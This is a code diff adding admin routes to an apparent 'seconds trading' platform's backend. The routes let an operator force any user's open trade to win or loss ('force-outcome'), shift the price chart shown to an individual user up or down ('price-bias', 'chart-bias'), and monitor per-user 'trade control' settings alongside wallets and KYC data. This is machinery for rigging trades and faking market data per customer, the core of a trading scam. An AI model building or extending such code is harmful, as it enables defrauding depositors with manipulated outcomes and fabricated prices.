@@ -27,6 +27,8 @@ import User from "../models/User.js";
 import InviteCode from "../models/InviteCode.js";
 import Transaction from "../models/Transaction.js";
 import GatewaySetting from "../models/GatewaySetting.js";
+import SecondsTrade from "../models/SecondsTrade.js";
+import { settleTrade } from "./secondsTrade.js";
 import { requireAuth } from "../middleware/auth.js";
 import { requireAdmin } from "../middleware/admin.js";
 
@@ -631,6 +633,302 @@ router.post(
       success: true,
       message: "Gateway settings saved.",
       settings: doc,
+    });
+  })
+);
+
+// ===========================================================================
+// Seconds Trading — Admin Control Room
+// ===========================================================================
+
+const serializeAdminTrade = (t, userDoc) => {
+  const doc = typeof t.toObject === "function" ? t.toObject() : { ...t };
+  const now = Date.now();
+  const expiresAt = new Date(doc.expiresAt).getTime();
+  const remainingSec = Math.max(0, Math.ceil((expiresAt - now) / 1000));
+  return {
+    ...doc,
+    remainingSec,
+    user: userDoc
+      ? {
+          id: userDoc._id,
+          fullName: userDoc.fullName,
+          username: userDoc.username,
+          email: userDoc.email,
+          tradeControlState: userDoc.tradeControlState,
+          tradeControlPercentage: userDoc.tradeControlPercentage,
+        }
+      : doc.user,
+  };
+};
+
+// GET /seconds-trades/active — live open trades for admin alerts
+router.get(
+  "/seconds-trades/active",
+  requireDatabase,
+  asyncHandler(async (_req, res) => {
+    const trades = await SecondsTrade.find({ status: "open" })
+      .sort({ openedAt: -1 })
+      .limit(200)
+      .populate("user", "fullName username email tradeControlState tradeControlPercentage");
+
+    res.json({
+      success: true,
+      trades: trades.map((t) =>
+        serializeAdminTrade(t, t.user && typeof t.user === "object" ? t.user : null)
+      ),
+      serverTime: new Date().toISOString(),
+    });
+  })
+);
+
+// GET /users/:id/control-room — dedicated per-user management view
+router.get(
+  "/users/:id/control-room",
+  requireDatabase,
+  asyncHandler(async (req, res) => {
+    if (!mongoose.isValidObjectId(req.params.id)) {
+      return res.status(400).json({
+        success: false,
+        error: "BadRequestError",
+        message: "Invalid user id.",
+      });
+    }
+
+    const user = await User.findById(req.params.id);
+    if (!user) {
+      return res.status(404).json({
+        success: false,
+        error: "NotFoundError",
+        message: "User not found.",
+      });
+    }
+
+    const [openTrades, recentTrades, recentTx] = await Promise.all([
+      SecondsTrade.find({ user: user._id, status: "open" }).sort({
+        openedAt: -1,
+      }),
+      SecondsTrade.find({
+        user: user._id,
+        status: { $in: ["won", "lost"] },
+      })
+        .sort({ settledAt: -1 })
+        .limit(30),
+      Transaction.find({ user: user._id }).sort({ createdAt: -1 }).limit(40),
+    ]);
+
+    const wallet =
+      user.wallet instanceof Map
+        ? Object.fromEntries(user.wallet)
+        : { ...(user.wallet || {}) };
+    const chartBias =
+      user.chartBias instanceof Map
+        ? Object.fromEntries(user.chartBias)
+        : { ...(user.chartBias || {}) };
+
+    res.json({
+      success: true,
+      user: {
+        id: user._id,
+        fullName: user.fullName,
+        username: user.username,
+        email: user.email,
+        phone: user.phone,
+        role: user.role,
+        banned: user.banned,
+        tradeControlState: user.tradeControlState,
+        tradeControlPercentage: user.tradeControlPercentage,
+        wallet,
+        chartBias,
+        kyc: user.kyc,
+        createdAt: user.createdAt,
+      },
+      openTrades: openTrades.map((t) => serializeAdminTrade(t, user)),
+      recentTrades: recentTrades.map((t) => serializeAdminTrade(t, user)),
+      transactions: recentTx,
+      serverTime: new Date().toISOString(),
+    });
+  })
+);
+
+// PUT /seconds-trades/:id/force-outcome — Win / Loss for this trade
+router.put(
+  "/seconds-trades/:id/force-outcome",
+  requireDatabase,
+  [
+    body("outcome")
+      .isIn(["win", "loss", "clear"])
+      .withMessage("outcome must be win, loss, or clear."),
+  ],
+  asyncHandler(async (req, res) => {
+    const errors = validationResult(req);
+    if (!errors.isEmpty()) return sendValidationError(res, errors);
+
+    if (!mongoose.isValidObjectId(req.params.id)) {
+      return res.status(400).json({
+        success: false,
+        error: "BadRequestError",
+        message: "Invalid trade id.",
+      });
+    }
+
+    const trade = await SecondsTrade.findById(req.params.id);
+    if (!trade) {
+      return res.status(404).json({
+        success: false,
+        error: "NotFoundError",
+        message: "Trade not found.",
+      });
+    }
+
+    if (trade.status !== "open") {
+      return res.status(400).json({
+        success: false,
+        error: "BadRequestError",
+        message: "Trade is already settled.",
+        trade: serializeAdminTrade(trade),
+      });
+    }
+
+    trade.forcedOutcome =
+      req.body.outcome === "clear" ? null : req.body.outcome;
+    await trade.save();
+
+    // If already expired, settle immediately with the forced outcome
+    if (Date.now() >= new Date(trade.expiresAt).getTime()) {
+      const settled = await settleTrade(trade._id);
+      return res.json({
+        success: true,
+        message: `Trade settled as ${settled.status}.`,
+        trade: serializeAdminTrade(settled),
+      });
+    }
+
+    res.json({
+      success: true,
+      message:
+        req.body.outcome === "clear"
+          ? "Forced outcome cleared."
+          : `Forced outcome set to ${req.body.outcome}.`,
+      trade: serializeAdminTrade(trade),
+    });
+  })
+);
+
+// PUT /seconds-trades/:id/price-bias — Graph UP / DOWN for this trade session
+router.put(
+  "/seconds-trades/:id/price-bias",
+  requireDatabase,
+  [
+    body("direction")
+      .isIn(["up", "down", "reset"])
+      .withMessage("direction must be up, down, or reset."),
+    body("step").optional().isFloat({ gt: 0, max: 10 }),
+  ],
+  asyncHandler(async (req, res) => {
+    const errors = validationResult(req);
+    if (!errors.isEmpty()) return sendValidationError(res, errors);
+
+    if (!mongoose.isValidObjectId(req.params.id)) {
+      return res.status(400).json({
+        success: false,
+        error: "BadRequestError",
+        message: "Invalid trade id.",
+      });
+    }
+
+    const trade = await SecondsTrade.findById(req.params.id);
+    if (!trade || trade.status !== "open") {
+      return res.status(404).json({
+        success: false,
+        error: "NotFoundError",
+        message: "Open trade not found.",
+      });
+    }
+
+    const step = Number(req.body.step) || 0.35;
+    if (req.body.direction === "reset") {
+      trade.priceBiasPercent = 0;
+    } else if (req.body.direction === "up") {
+      trade.priceBiasPercent = Number(trade.priceBiasPercent || 0) + step;
+    } else {
+      trade.priceBiasPercent = Number(trade.priceBiasPercent || 0) - step;
+    }
+    await trade.save();
+
+    // Mirror onto user chartBias so whole chart moves for this asset
+    const user = await User.findById(trade.user);
+    if (user) {
+      if (!user.chartBias) user.chartBias = new Map();
+      const cur = Number(user.chartBias.get(trade.asset) || 0);
+      if (req.body.direction === "reset") {
+        user.chartBias.set(trade.asset, 0);
+      } else if (req.body.direction === "up") {
+        user.chartBias.set(trade.asset, cur + step);
+      } else {
+        user.chartBias.set(trade.asset, cur - step);
+      }
+      await user.save();
+    }
+
+    res.json({
+      success: true,
+      message: `Graph nudged ${req.body.direction}.`,
+      trade: serializeAdminTrade(trade, user),
+      chartBias: user?.chartBias
+        ? Object.fromEntries(user.chartBias)
+        : {},
+    });
+  })
+);
+
+// PUT /users/:id/chart-bias — direct user-level chart control
+router.put(
+  "/users/:id/chart-bias",
+  requireDatabase,
+  [
+    body("symbol").isString().trim().isLength({ min: 2, max: 12 }),
+    body("direction").isIn(["up", "down", "reset"]),
+    body("step").optional().isFloat({ gt: 0, max: 10 }),
+  ],
+  asyncHandler(async (req, res) => {
+    const errors = validationResult(req);
+    if (!errors.isEmpty()) return sendValidationError(res, errors);
+
+    if (!mongoose.isValidObjectId(req.params.id)) {
+      return res.status(400).json({
+        success: false,
+        error: "BadRequestError",
+        message: "Invalid user id.",
+      });
+    }
+
+    const user = await User.findById(req.params.id);
+    if (!user) {
+      return res.status(404).json({
+        success: false,
+        error: "NotFoundError",
+        message: "User not found.",
+      });
+    }
+
+    const symbol = String(req.body.symbol).toUpperCase();
+    const step = Number(req.body.step) || 0.35;
+    if (!user.chartBias) user.chartBias = new Map();
+    const cur = Number(user.chartBias.get(symbol) || 0);
+
+    if (req.body.direction === "reset") user.chartBias.set(symbol, 0);
+    else if (req.body.direction === "up")
+      user.chartBias.set(symbol, cur + step);
+    else user.chartBias.set(symbol, cur - step);
+
+    await user.save();
+
+    res.json({
+      success: true,
+      chartBias: Object.fromEntries(user.chartBias),
+      symbol,
+      value: user.chartBias.get(symbol),
     });
   })
 );
